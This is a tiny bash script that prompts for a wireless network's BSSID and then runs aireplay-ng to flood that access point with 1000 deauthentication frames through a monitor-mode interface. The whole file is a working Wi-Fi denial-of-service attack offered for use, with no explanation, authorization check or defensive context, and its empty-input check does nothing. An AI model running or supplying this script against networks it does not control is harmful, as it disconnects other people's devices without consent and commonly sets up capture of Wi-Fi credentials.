#!/bin/bash
 
  
  echo "**********************************"
  echo "* Please enter the network BSSID *"
  echo "**********************************"
  echo ""
  
    read BSSID
      [[ $BSSID == "" ]]
      clear
      
  
sudo aireplay-ng --deauth 1000 -a $BSSID   wlan0mon

